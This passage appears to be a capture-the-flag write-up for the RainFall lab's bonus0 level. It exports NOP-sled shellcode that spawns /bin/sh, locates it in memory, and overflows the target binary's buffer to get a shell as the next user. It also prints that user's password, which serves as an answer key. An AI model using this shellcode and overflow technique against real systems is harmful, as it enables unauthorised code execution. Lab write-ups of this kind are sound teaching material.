To make this code work we have to first export the shellcode, we can do that with this command:

```sh
export SHELLCODE=$(python -c "print('\x90' * 500 + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80')")
```

Then we can retrieve the address of SHELLCODE with the env_address script:

```sh
bonus0@RainFall:/tmp$ ./a.out SHELLCODE
Searching address of SHELLCODE env variable:
Big-endian format: 0xbffff71f
Lil-endian format: \x1f\xf7\xff\xbf
```

Finally we can copy the Lil-endian format, and replace the ADDRESS by it:

```sh
(python -c "print '\x90' * 30"; python -c "print 'A' * 9 + '$ADDRESS' + 'B' * 7"; cat) | /home/user/bonus0/bonus0
```

```sh
bonus0@RainFall:~$ (python -c "print '\x90' * 30"; python -c "print 'A' * 9 + '\x1f\xf7\xff\xbf' + 'B' * 7"; cat) | /home/user/bonus0/bonus0
 - 
 - 
��������������������AAAAAAAAA���BBBBBBB��� AAAAAAAAA���BBBBBBB���
whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```
